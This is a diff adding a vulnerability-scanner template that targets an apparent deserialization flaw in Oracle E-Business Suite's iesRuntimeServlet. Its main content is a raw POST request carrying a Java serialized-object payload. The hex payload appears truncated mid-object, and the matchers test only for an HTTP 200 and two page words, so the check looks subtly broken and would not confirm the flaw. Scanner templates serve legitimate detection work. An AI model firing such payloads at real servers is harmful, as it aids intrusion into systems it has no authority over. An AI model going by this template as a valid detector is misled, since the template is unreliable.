@@ -1,0 +1,30 @@
+id: oracle-ebusiness-iesruntime-deserialization
+info:
+  name: Oracle E-Business Suite iesRuntimeServlet Deserialization Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Oracle E-Business Suite iesRuntimeServlet endpoint contains a deserialization vulnerability that allows remote code execution. Exploitation can lead to arbitrary code execution on the system, allowing attackers to take full control of the server.
+  tags: code-execution, deserialization
+  reference:
+    - https://erpscan.io/press-center/blog/oracle-ebs-penetration-testing-tool/
+
+http:
+  - raw:
+      - |
+        POST /OA_HTML/iesRuntimeServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-java-serialized-object
+
+        {{base64('aced0005737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c770800000010000000017372000c6a6176612e6e65742e55524c962537361afce47203000749000868617368436f6465490004706f72744c0009617574686f726974797400124c6a6176612f6c616e672f537472696e673b4c000466696c6571007e00034c0004686f737471007e00034c000870726f746f636f6c71007e00034c000372656671007e00037870ffffffffffffffff74')}}
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "iesRuntimeServlet"
+          - "Oracle E-Business Suite"
+        part: body
